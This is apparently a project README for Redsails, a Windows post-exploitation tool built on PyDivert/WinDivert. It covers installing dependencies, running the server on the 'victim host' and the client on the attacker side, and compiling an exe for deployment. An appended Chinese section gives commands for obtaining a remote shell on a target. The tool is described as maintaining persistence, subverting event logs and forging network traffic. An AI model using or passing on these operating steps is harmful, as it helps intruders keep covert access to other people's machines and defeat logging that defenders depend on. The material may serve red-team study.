# Redsails

## About
A post-exploitation tool capable of:
-	maintaining persistence on a compromised machine
-	subverting many common host event logs (both network and account logon)
-	generating false logs / network traffic

Based on [PyDivert] (https://github.com/ffalcinelli/pydivert), a Python binding for [WinDivert](https://www.reqrypt.org/windivert.html), a Windows driver that allows user-mode applications to capture/modify/drop network packets sent to/from the Windows network stack.

Built for Windows operating systems newer than Vista and Windows 2008 (including Windows 7, Windows 8 and Windows 10).

## Dependencies
  Redsails has dependencies PyDivert and WinDivert. You can resolve those dependencies by running:
  #### `pip install pydivert`
  #### `pip install pbkdf2`
 
 Pycrypto is also needed.
  #### `easy_install pycrypto`
  Pycrypto may have a dependency on [Microsoft Visual C++ Compiler for Python 2.7] (http://aka.ms/vcpython27)
  
## Usage
- Server (victim host you are attacking)
  #### `redSails.py`
  
  Or if the victim does not have python installed, you can run provided exe (or compile your own! instructions below)
  #### `redSails.exe

- Client (attacker)
  #### `redSailsClient.py <ip> <port>`

## Creating an executable
  To compile an exe (for deployment) inlieu of the python script, you will need pyinstaller:
  #### `pip install pyinstaller`
  
  Then you can create the exe:
  #### `pyinstaller-script.py -F --clean redSails.spec`
  
## License

用法:
```
在目标主机上执行:
redsails.exe -a <IP Address> -p <password> -o <port>
在本地进行监听，使用相同的密码就可以获得一个shell
python redsailsClient.py -t <IP Address> -p <password> -o <port>
```
